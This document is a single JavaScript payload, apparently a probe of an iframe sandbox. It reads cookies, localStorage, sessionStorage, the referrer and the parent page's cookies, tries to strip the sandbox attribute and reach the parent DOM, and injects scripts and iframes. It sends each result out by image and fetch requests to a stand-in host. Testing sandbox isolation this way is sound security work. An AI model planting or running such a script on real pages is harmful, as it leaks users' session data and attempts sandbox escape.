<script>
(function(){
  var hit = function(tag, extra){
    var url = 'https://google.com/?test=' + encodeURIComponent(tag);
    if(extra) url += '&data=' + encodeURIComponent(extra);
    // Try multiple exfil methods so at least one shows in Network
    try{ new Image().src = url; }catch(e){}
    try{ fetch(url, {mode:'no-cors'}); }catch(e){}
  };

  // 1. Confirm script executed at all
  hit('script-executed');

  // 2. Cookie access (should fail if not allow-same-origin)
  try{ hit('cookies', document.cookie); }catch(e){ hit('cookies-blocked', e.message); }

  // 3. localStorage access
  try{ hit('localStorage', JSON.stringify(localStorage)); }catch(e){ hit('localStorage-blocked', e.message); }

  // 4. sessionStorage access
  try{ hit('sessionStorage', JSON.stringify(sessionStorage)); }catch(e){ hit('sessionStorage-blocked', e.message); }

  // 5. Origin / location info
  try{ hit('origin', location.origin + ' | ' + location.href); }catch(e){ hit('origin-blocked', e.message); }

  // 6. Parent DOM access (sandbox escape attempt)
  try{ var p = window.parent.document.body.innerHTML.length; hit('parent-dom-accessible', 'length='+p); }
  catch(e){ hit('parent-dom-blocked', e.message); }

  // 7. Try to remove own sandbox attribute via parent
  try{ window.parent.document.querySelector('iframe').removeAttribute('sandbox'); hit('sandbox-removed'); }
  catch(e){ hit('sandbox-removal-blocked', e.message); }

  // 8. Top-level navigation attempt
  try{ var t = top.location.href; hit('top-readable', t); }catch(e){ hit('top-read-blocked', e.message); }
  // (not actually navigating — that would end the test)

  // 9. postMessage to parent
  try{ parent.postMessage('escape-attempt-from-iframe', '*'); hit('postmessage-sent'); }
  catch(e){ hit('postmessage-blocked', e.message); }

  // 10. window.open (needs allow-popups)
  try{ var w = open('about:blank'); if(w){ hit('popup-opened'); w.close(); } else { hit('popup-null'); } }
  catch(e){ hit('popup-blocked', e.message); }

  // 11. Form creation and submission (needs allow-forms)
  try{
    var f = document.createElement('form');
    f.action = 'https://google.com/?test=form-submit';
    f.method = 'GET';
    f.target = '_blank';
    document.body.appendChild(f);
    // Don't actually submit — just confirm we could build it
    hit('form-built');
  }catch(e){ hit('form-blocked', e.message); }

  // 12. Dynamic script injection
  try{
    var s = document.createElement('script');
    s.src = 'https://google.com/?test=dynamic-script';
    document.body.appendChild(s);
    hit('dynamic-script-appended');
  }catch(e){ hit('dynamic-script-blocked', e.message); }

  // 13. Dynamic iframe injection
  try{
    var i = document.createElement('iframe');
    i.src = 'https://google.com/?test=dynamic-iframe';
    document.body.appendChild(i);
    hit('dynamic-iframe-appended');
  }catch(e){ hit('dynamic-iframe-blocked', e.message); }

  // 14. eval availability
  try{ eval("hit('eval-works')"); }catch(e){ hit('eval-blocked', e.message); }

  // 15. document.write
  try{ document.write('<img src="https://google.com/?test=doc-write">'); hit('doc-write-ok'); }
  catch(e){ hit('doc-write-blocked', e.message); }

  // 16. Modify own DOM (visible defacement)
  try{ document.body.style.background = 'red'; hit('dom-mutation-ok'); }
  catch(e){ hit('dom-mutation-blocked', e.message); }

  // 17. Read referrer
  try{ hit('referrer', document.referrer); }catch(e){ hit('referrer-blocked', e.message); }

  // 18. Read user agent
  try{ hit('user-agent', navigator.userAgent); }catch(e){}

  // 19. Try to access parent cookies via same-origin
  try{ hit('parent-cookies', window.parent.document.cookie); }
  catch(e){ hit('parent-cookies-blocked', e.message); }

  // 20. Check if we're sandboxed at all
  try{
    var sandboxed = window.self !== window.top || document.domain === '';
    hit('sandbox-state', 'self!==top: ' + (window.self !== window.top));
  }catch(e){ hit('sandbox-check-error', e.message); }

  // Final marker so you know the script ran to completion
  hit('script-completed');
})();
</script>
